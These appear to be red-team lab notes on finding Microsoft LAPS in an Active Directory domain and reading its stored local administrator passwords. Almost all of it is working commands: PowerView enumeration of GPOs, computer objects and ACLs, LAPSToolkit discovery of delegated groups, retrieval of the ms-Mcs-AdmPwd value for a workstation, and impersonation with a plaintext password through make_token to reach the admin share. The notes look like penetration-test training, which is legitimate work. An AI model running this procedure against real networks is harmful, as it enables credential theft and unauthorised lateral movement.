# Hunting for LAPS

```bash
# On disk
ls C:\Program Files\LAPS\CSE

# Search for laps within the GPOs. Looking for gpcfilesyspath
powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl
ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine
download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol
Parse-PolFile .\Desktop\Registry.pol

# Search for machines where AdmPwd expiration is not null
powershell Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName
```

---

# Reading the ms-Mcs-admnPwd

```bash
# Check which principals are allowed to read DACL
powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108

# Also with tooling
powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
powershell Find-LAPSDelegatedGroups

# If our user is part of one of the above groups we can read the password and impersonte admin on that machine
# From wkstn-2 as bfarmer
powershell Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd
make_token .\LapsAdmin 1N3FyjJR5L18za

ls \\wkstn-1\c$
```
